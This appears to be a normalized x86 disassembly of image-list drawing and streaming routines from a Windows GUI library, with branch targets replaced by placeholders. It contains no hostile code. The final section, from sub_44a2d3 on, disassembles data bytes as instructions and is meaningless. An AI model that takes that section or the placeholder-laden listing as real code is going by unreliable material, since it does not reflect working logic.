mov [ ebx + 0x44 ] esi
mov eax esi
call sub_448b10
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403420
pop esi
pop ebx
retn
sub_4490f8
push ebx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_448dfc
push eax
call ImageList_GetBkColor
call sub_448b30
pop ebx
retn
sub_449120
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_448b10
push eax
mov eax ebx
call sub_4490f8
call sub_448b10
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41d530
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_448dfc
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4201f0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41cc90
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_4124e4
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4201f0
pop edx
call sub_41d034
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4201f0
call sub_41d530
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_448dfc
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_4124e4
mov eax [ ebx + 0x54 ]
call sub_4201f0
call sub_41d530
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41cc90
mov eax edi
call sub_41d530
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41cc90
mov eax edi
call sub_41d530
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_420f60
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_4492f4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_449318
pop ebx
pop ebp
retn 0xc
sub_449318
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_449364
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4124e4
mov eax [ ebp - 0x4 ]
call sub_449ff8
xor eax eax
push ebp
push sub_4494fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4494e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4494c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_420f60
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4494ca
mov eax [ ebp - 0x10 ]
call sub_403224
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4201f0
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d034
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41d530
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4201f0
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d034
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41d530
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_448f38
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44950c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_448dfc
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_449364
sub_44952c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax ebx
call sub_448e60
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413ebc
mov eax ebx
call sub_4490b4
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_449714
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_448dfc
mov edx eax
mov eax ebx
call sub_448d98
mov eax ebx
call sub_448cc0
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_448dfc
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_448cc8
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_448dfc
push eax
call ImageList_GetBkColor
call sub_448b30
mov edx eax
mov eax ebx
call sub_4490c0
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44950c
jmp r-xdata
sub_4495ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413fa0
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_449714
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_4490b4
mov eax esi
call sub_448dfc
mov edx eax
mov eax ebx
call sub_448d98
mov eax ebx
call sub_448cc0
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_448dfc
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_448cc8
jmp r-xdata
mov eax esi
call sub_448dfc
push eax
call ImageList_GetBkColor
call sub_448b30
mov edx eax
mov eax ebx
call sub_4490c0
mov edx esi
mov eax ebx
call sub_44950c
pop esi
pop ebx
retn
sub_44969c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449708
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44970f
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44973c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_413918
mov si 0xffff
call sub_403420
inc ebp
dec edi
jne r-xdata
sub_44978c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413808
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413918
cmp ebp eax
jne r-xdata
sub_4497e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407aec
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_449828
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_449004
mov ebx eax
mov eax edi
call sub_449004
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_449004
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_449904
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4498e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4497e4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498ee
mov eax [ ebp - 0xc ]
call sub_403224
retn
mov eax edi
call sub_449004
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_449918
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_449004
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_449828
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_449974
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419768
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_449918
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4499cc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_4158bc
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_4158bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_449c50
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_415690
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_4156b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_449c33
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_420f60
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4124e4
mov eax [ ebp - 0x4 ]
call sub_449ff8
xor eax eax
push ebp
push sub_449c16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449c1d
mov eax [ ebp - 0xc ]
call sub_403224
mov eax [ ebp - 0x14 ]
call sub_403224
mov eax [ ebp - 0x4 ]
call sub_449ffc
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41250c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4201f0
push eax
mov eax [ ebp - 0xc ]
call sub_4201f0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41cf00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41250c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4201f0
push eax
mov eax [ ebp - 0x14 ]
call sub_4201f0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41cf00
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_448f38
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_449c60
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ee8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449cc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_448dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449cc7
mov eax [ ebp - 0xc ]
call sub_403224
retn
sub eax 0xffffffec
sub_449cc7
mov eax [ ebp - 0x4 ]
call sub_448cc0
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_449df6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4156b0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_415db8
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4156b0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403224
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4156b0
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ee8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449dd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_4156b0
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_448dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403224
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4156b0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_449e28
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_448e60
mov eax edi
call sub_415690
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_4156b0
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_4499cc
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_449c60
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_449eb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ee8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_449fae
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bc40
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_448dfc
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_448dfc
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449fb5
mov eax [ ebp - 0x4 ]
call sub_403224
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
jmp r-xdata
sub_44a01c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
mov edx esi
call sub_44978c
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_44a068
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44a08d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a094
retn
sub_44a2d3
adc [ eax ] al
adc [ edx + 0x103c0041 ] dh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x44a2e8c0 ] cl
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
je r-xdata
je r-xdata
inc esp
add [ esp + ebx * 4 - 0x470bffbf ] dh
inc esp
add [ esp + ebx * 4 ] al
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
mov [ 0x4d050044 ] al
outsb
jne r-xdata
add [ eax ] al
insd
inc ecx
jne r-xdata
push 0x5c004034
xor al 0x40
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ecx + edi * 4 - 0x1dd7ffbc ] bl
inc esp
add [ edi + edi * 4 + 0x3ebc0044 ] ch
inc ecx
add ah dh
mov ebp 0xe2a00044
inc esp
add [ eax - 0x68 ] dl
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x2000419b ] al
mov ecx 0xd4700044
inc esp
add [ eax ] al
retn 0x44
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ esp + eax * 2 + 0x44a51400 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fisub [ esp + eax * 2 + 0x44a50600 ]
add [ eax + eax + 0x21e40000 ] ch
inc ecx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ esp + esi + 0x40 ] bl
mov dh 0x44
add [ eax - 0x4a ] al
inc esp
add ah dl
mov dh 0x44
add [ eax - 0x4a ] dh
inc esp
add ah ah
add [ eax + eax - 0x60 ] 0x100044b6
mov bh 0x44
add [ edi + esi * 4 + 0x44 ] al
add [ eax - 0x49 ] bh
inc esp
add ah dl
mov bh 0x44
add ah dh
mov bh 0x44
add [ eax + edi * 4 ] dl
inc esp
add [ eax + edi * 4 ] dh
inc esp
add [ eax - 0x7e ] bl
inc esp
add [ eax + edi * 4 + 0x44 ] dl
add [ eax - 0x7e ] ah
inc esp
add [ edx + eax * 4 + 0x44 ] ah
add [ eax - 0x48 ] dh
inc esp
add [ eax + edi * 4 - 0x474bffbc ] dl
inc esp
add ah dl
mov eax 0xb5b00044
inc esp
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] bl
mov eax eax
mov al [ 0x44a3 ]
add [ eax ] dl
inc ecx
add [ eax - 0x13ffbe64 ] bl
pushfd
inc ecx
add al bl
mov ch 0x44
add [ esp + esi + 0x40 ] dl
inc esp
add [ eax + eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xa4
outsd
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
mov [ 0x6d0b0044 ] al
popad
inc ecx
jne r-xdata
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
inc eax
outsd
insd
popad
je r-xdata
lodsb [ esi ]
arpl [ eax ] cx
insd
popad
dec ebp
popad
outsb
jne r-xdata
jpe r-xdata
insb
or [ ebp + 0x61 ] ch
push eax
popad
jb r-xdata
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
